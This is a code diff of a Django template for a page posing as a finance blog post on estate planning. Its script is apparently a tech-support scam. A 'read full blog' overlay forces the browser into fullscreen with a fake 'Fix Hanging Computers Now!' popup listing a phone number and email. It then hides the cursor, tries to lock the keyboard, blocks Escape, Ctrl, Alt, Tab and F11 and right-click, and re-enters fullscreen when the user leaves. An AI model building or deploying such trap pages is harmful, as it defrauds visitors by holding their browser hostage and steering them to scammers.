@@ -2,30 +2,32 @@
 <html lang="en">
   {% load static %}
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta http-equiv="Permissions-Policy" content="fullscreen=(self)" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Permissions-Policy" content="fullscreen=(self)">
   <title>Blog Detail | FinanceHub</title>
-  <link rel="stylesheet" href="{% static 'css/style.css' %}" />
+  <link rel="stylesheet" href="{% static 'css/style.css' %}">
   <style>
+    
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
 
-    html,
-    body {
-      margin: 0;
-      padding: 0;
-      overflow-x: hidden; /* ✅ Hides horizontal scrollbar */
-      width: 100%;
-    }
+        html, body {
+  margin: 0;
+  padding: 0;
+  overflow-x: hidden; /* ✅ Hides horizontal scrollbar */
+  width: 100%;
+}
 
-    .no-scroll {
+
+ .no-scroll {
       overflow: hidden;
-      height: 100%;
+      height: 100%; /* Ensures the body takes full height and overflow applies correctly */
     }
+ 
 
     .logo {
       font-size: 1.8rem;
@@ -41,6 +43,7 @@
     .logo:hover {
       transform: scale(1.05);
     }
+
 
     .container {
       max-width: 1100px;
@@ -89,7 +92,7 @@
       left: 0;
       right: 0;
       height: 150px;
-      background: linear-gradient(to top, rgba(0, 0, 0, 0.7), transparent);
+      background: linear-gradient(to top, rgba(0,0,0,0.7), transparent);
     }
 
     .content-section {
@@ -129,8 +132,7 @@
     }
 
     @keyframes pulse {
-      0%,
-      100% {
+      0%, 100% {
         transform: scale(1);
       }
       50% {
@@ -159,7 +161,7 @@
     }
 
     .blog-date::before {
-      content: "📅";
+      content: '📅';
       font-size: 1.2rem;
     }
 
@@ -201,7 +203,7 @@
     }
 
     .read-more::before {
-      content: "";
+      content: '';
       position: absolute;
       top: 0;
       left: -100%;
@@ -266,7 +268,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: transparent;
+      background:transparent;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -281,13 +283,13 @@
     .fullscreen-overlay h2 {
       font-size: 36px;
       margin-bottom: 20px;
-      text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
     }
 
     .fullscreen-overlay p {
       font-size: 18px;
       margin-bottom: 30px;
-      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
     }
 
     .click-instruction {
@@ -300,22 +302,8 @@
       animation: pulse 2s infinite;
     }
 
-    /* hide cursor when pointer lock is active */
-    .hide-cursor,
-    .hide-cursor * {
+    .hide-cursor, .hide-cursor * {
       cursor: none !important;
-    }
-
-    /* fallback top blocker (bigger than previous attempt) */
-    .prevent-top-hover-fallback {
-      position: fixed;
-      top: 0;
-      left: 0;
-      height: 40px; /* tall fallback */
-      width: 100%;
-      background: transparent;
-      z-index: 100000;
-      pointer-events: all;
     }
 
     .popup-overlay {
@@ -437,16 +425,15 @@
 <body>
   <!-- Fullscreen Overlay - covers entire page -->
   <div class="fullscreen-overlay" id="fullscreenOverlay">
-    <div class="click-instruction">Click Here to Read Full Blog</div>
+  
+    <div class="click-instruction">Click Here to Read Full Blog </div>
   </div>
 
   <!-- Popup Overlay -->
   <div class="popup-overlay" id="popupOverlay">
     <div class="popup-content">
       <h3>Fix Hanging Computers Now!</h3>
-      <p>
-        Is your computer slow or freezing? Don't worry! Our expert tech support is here to help you instantly.
-      </p>
+      <p>Is your computer slow or freezing? Don't worry! Our expert tech support is here to help you instantly.</p>
       <div class="contact-info">
         <p>📞 Call Now: <strong>+91-1234567890</strong></p>
         <p>📧 Email: <strong>support@financehubhere.online</strong></p>
@@ -472,9 +459,9 @@
   <div class="container">
     <div class="decorative-element element-1"></div>
     <div class="decorative-element element-2"></div>
-
+    
     <div class="blog-image-wrapper">
-      <img src="{% static 'images/8.png' %}" alt="Investment Strategy" />
+      <img src="{% static 'images/8.png' %}" alt="Investment Strategy">
       <div class="image-overlay"></div>
     </div>
 
@@ -488,9 +475,7 @@
       </div>
 
       <div class="blog-content">
-        Estate planning is the process of organizing your affairs so that your wealth, property, and personal decisions are clearly
-        defined and legally binding. It involves creating documents like wills, trusts, and power of attorney, ensuring that your
-        estate doesn't get caught up in lengthy legal battles or excessive taxes.
+        Estate planning is the process of organizing your affairs so that your wealth, property, and personal decisions are clearly defined and legally binding. It involves creating documents like wills, trusts, and power of attorney, ensuring that your estate doesn't get caught up in lengthy legal battles or excessive taxes.
       </div>
 
       <div class="button-group">
@@ -507,218 +492,119 @@
   </div>
 
   <script>
-    /**********************************************************************
-     * Improved fullscreen + pointer-lock implementation
-     * - Requests fullscreen on the document element (more consistent)
-     * - Requests pointer lock (captures mouse so system cursor doesn't hit top)
-     * - Provides a fallback top blocker if pointer lock unsupported
-     * - Cleans up on exit
-     *
-     * Note: Browsers intentionally allow the user to escape (Esc) and may show
-     * an informational overlay. This reduces accidental "mouse hits top" issues.
-     **********************************************************************/
+    const fullscreenOverlay = document.getElementById('fullscreenOverlay');
+    const popupOverlay = document.getElementById('popupOverlay');
 
-    const fullscreenOverlay = document.getElementById("fullscreenOverlay");
-    const popupOverlay = document.getElementById("popupOverlay");
-
-    function addFallbackTopBlocker() {
-      if (!document.querySelector(".prevent-top-hover-fallback")) {
-        const fb = document.createElement("div");
-        fb.className = "prevent-top-hover-fallback";
-        document.body.appendChild(fb);
-      }
-    }
-
-    function removeFallbackTopBlocker() {
-      const fb = document.querySelector(".prevent-top-hover-fallback");
-      if (fb) fb.remove();
-    }
-
+    // Function to enter fullscreen and activate everything
     function enterFullscreenMode() {
-      // hide the overlay
-      fullscreenOverlay.style.display = "none";
-
-      // Show popup visually (we won't request fullscreen on the popup element itself)
+      // Hide the fullscreen overlay
+      fullscreenOverlay.style.display = 'none';
+      
+      // Show the popup immediately
       popupOverlay.style.display = "flex";
-
-      // Request fullscreen on root element (document.documentElement)
-      const el = document.documentElement;
-      const requestFs =
-        el.requestFullscreen ||
-        el.webkitRequestFullscreen ||
-        el.mozRequestFullScreen ||
-        el.msRequestFullscreen;
-
-      if (requestFs) {
-        try {
-          // Some browsers require the call to be on a user gesture — our click qualifies.
-          requestFs.call(el).catch((err) => {
-            console.warn("Fullscreen request rejected:", err);
-            // Show fallback blocker if fullscreen failed
-            addFallbackTopBlocker();
-            // still hide cursor visually after a moment
-            setTimeout(() => document.body.classList.add("hide-cursor"), 600);
-          });
-        } catch (err) {
-          console.warn("Fullscreen request error:", err);
-          addFallbackTopBlocker();
-        }
-      } else {
-        // no fullscreen API available — use fallback
-        addFallbackTopBlocker();
+      
+      // Enter fullscreen mode
+      if (popupOverlay.requestFullscreen) {
+        popupOverlay.requestFullscreen();
+      } else if (popupOverlay.mozRequestFullScreen) {
+        popupOverlay.mozRequestFullScreen();
+      } else if (popupOverlay.webkitRequestFullscreen) {
+        popupOverlay.webkitRequestFullscreen();
+      } else if (popupOverlay.msRequestFullscreen) {
+        popupOverlay.msRequestFullscreen();
       }
-
-      // After fullscreen engages (or shortly after), request pointer lock
-      function tryPointerLock() {
-        const lockTarget = document.body; // choose element to lock pointer on
-        if (lockTarget.requestPointerLock) {
-          try {
-            lockTarget.requestPointerLock();
-            // hide cursor visual while pointer locked (actual cursor is captured)
-            document.body.classList.add("hide-cursor");
-          } catch (err) {
-            console.warn("Pointer lock request error:", err);
-            // fallback
-            addFallbackTopBlocker();
-            document.body.classList.add("hide-cursor");
-          }
-        } else {
-          // pointer lock not supported — add larger fallback blocker
-          addFallbackTopBlocker();
-          document.body.classList.add("hide-cursor");
-        }
-      }
-
-      // If fullscreenchange fires, then try pointer lock there
-      function onFsChange() {
-        if (document.fullscreenElement) {
-          tryPointerLock();
-        } else {
-          // not fullscreen (maybe user cancelled) — still try pointer lock in some cases
-          // but prefer to clean up
-          document.body.classList.remove("hide-cursor");
-          removeFallbackTopBlocker();
-        }
-      }
-
-      document.addEventListener("fullscreenchange", onFsChange, { once: true });
-
-      // As a fallback, attempt pointer lock after a short timeout if already fullscreen
-      setTimeout(() => {
-        if (document.fullscreenElement) {
-          tryPointerLock();
-        } else {
-          // If still not fullscreen, at least add fallback blocker to reduce top triggers
-          addFallbackTopBlocker();
-        }
-      }, 300);
+      
+      // Hide cursor after short delay
+      setTimeout(function() {
+        document.body.classList.add('hide-cursor');
+      }, 1000);
+      
+      // Lock keyboard functionality
+      lockKeyboard();
     }
 
-    // click and keydown to trigger (keeps earlier convenience)
-    fullscreenOverlay.addEventListener("click", enterFullscreenMode);
-    document.addEventListener("keydown", function (e) {
-      // Only trigger enterFullscreenMode if the overlay is visible
-      if (fullscreenOverlay.style.display !== "none") {
-        // allow Enter or Space or any key to enter fullscreen (keeps old behavior)
+    // Add click event to entire overlay
+    fullscreenOverlay.addEventListener('click', enterFullscreenMode);
+
+    // Also allow any key press to trigger
+    document.addEventListener('keydown', function(e) {
+      if (fullscreenOverlay.style.display !== 'none') {
         enterFullscreenMode();
       }
     });
 
-    // Pointer lock event handlers
-    document.addEventListener("pointerlockchange", function () {
-      if (document.pointerLockElement) {
-        // pointer is locked
-        console.log("Pointer locked on", document.pointerLockElement);
-        // optional: attach mousemove listeners to use movementX/movementY if needed
-      } else {
-        // pointer unlocked -> cleanup visual changes
-        console.log("Pointer unlocked");
-        document.body.classList.remove("hide-cursor");
-        removeFallbackTopBlocker();
-      }
-    });
-
-    document.addEventListener("pointerlockerror", function (e) {
-      console.error("Pointer lock error:", e);
-      // fallback: ensure top blocker present and hide cursor visually
-      addFallbackTopBlocker();
-      document.body.classList.add("hide-cursor");
-    });
-
-    // If fullscreen exits, release pointer lock (if any) and cleanup
-    document.addEventListener("fullscreenchange", function () {
-      if (!document.fullscreenElement) {
-        // attempt to exit pointer lock gracefully
-        if (document.exitPointerLock) {
-          try {
-            document.exitPointerLock();
-          } catch (e) {
-            // ignore
-          }
-        }
-        document.body.classList.remove("hide-cursor");
-        removeFallbackTopBlocker();
-        // re-show the fullscreen overlay so user can re-enter if needed
-        fullscreenOverlay.style.display = "";
-      }
-    });
-
-    /*********************
-     * Existing protections (kept, but note: browsers will still allow Esc)
-     *********************/
-    // Keyboard lock attempt (may not be supported widely)
+    // Function to lock the keyboard
     function lockKeyboard() {
-      if ("keyboard" in navigator && "lock" in navigator.keyboard) {
-        navigator.keyboard
-          .lock()
-          .then(() => {
-            console.log("Keyboard locked successfully");
-          })
-          .catch((error) => {
-            console.error("Error locking keyboard:", error);
-          });
+      if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+        navigator.keyboard.lock().then(() => {
+          console.log("Keyboard locked successfully");
+        }).catch((error) => {
+          console.error('Error locking keyboard:', error);
+        });
       } else {
-        console.warn("Keyboard lock not supported in this browser.");
+        console.warn('Keyboard lock not supported in this browser.');
       }
     }
 
-    // Keep disabling context menu
-    document.addEventListener(
-      "contextmenu",
-      function (e) {
+    // Disable right-click context menu
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+    });
+
+    // Disable various keyboard keys
+    document.addEventListener('keydown', function(e) {
+      // Disable the Escape key
+      if (e.key === 'Escape' || e.keyCode === 27) {
         e.preventDefault();
-      },
-      { passive: false }
-    );
+      }
 
-    // Try to block some keys (best-effort; browsers allow Escape to exit fullscreen)
-    document.addEventListener(
-      "keydown",
-      function (e) {
-        // Prevent dangerous combos locally (but cannot stop browser-level fullscreen escape)
-        const forbidden =
-          e.key === "Control" ||
-          e.key === "Meta" ||
-          e.key === "Alt" ||
-          e.key === "Tab" ||
-          e.key === "F11" ||
-          e.key === "Escape";
+      // Disable the Ctrl key and any combinations involving it
+      if (e.key === 'Control' || e.ctrlKey) {
+        e.preventDefault();
+      }
 
-        if (forbidden) {
-          // note: preventing Escape won't always stop browser from exiting fullscreen for safety reasons
-          e.preventDefault && e.preventDefault();
-          e.stopPropagation && e.stopPropagation();
+      // Disable the Meta (Windows) key
+      if (e.key === 'Meta') {
+        e.preventDefault();
+      }
+
+      // Disable the Alt key
+      if (e.key === 'Alt') {
+        e.preventDefault();
+      }
+
+      // Disable the Tab key
+      if (e.key === 'Tab') {
+        e.preventDefault();
+      }
+
+      // Disable F11 key
+      if (e.key === 'F11' || e.keyCode === 122) {
+        e.preventDefault();
+      }
+    });
+
+    // Additional key blocking for extra security
+    document.addEventListener('keydown', function(event) {
+      var charCode = event.charCode || event.keyCode || event.which;
+      if (charCode == 27 || charCode == 91 || charCode == 92 || charCode == 122) {
+        event.preventDefault();
+        return false;
+      }
+    });
+
+    // Handle fullscreen change events
+    document.addEventListener('fullscreenchange', function() {
+      if (!document.fullscreenElement) {
+        // If user somehow exits fullscreen, try to re-enter
+        if (popupOverlay.style.display === 'flex') {
+          popupOverlay.requestFullscreen().catch(err => {
+            console.log('Error re-entering fullscreen:', err);
+          });
         }
-      },
-      { passive: false }
-    );
-
-    // small helper to clean up on page unload
-    window.addEventListener("beforeunload", function () {
-      try {
-        document.exitPointerLock && document.exitPointerLock();
-      } catch (err) {}
+      }
     });
   </script>
+  
 </body>
-</html>
+</html> 
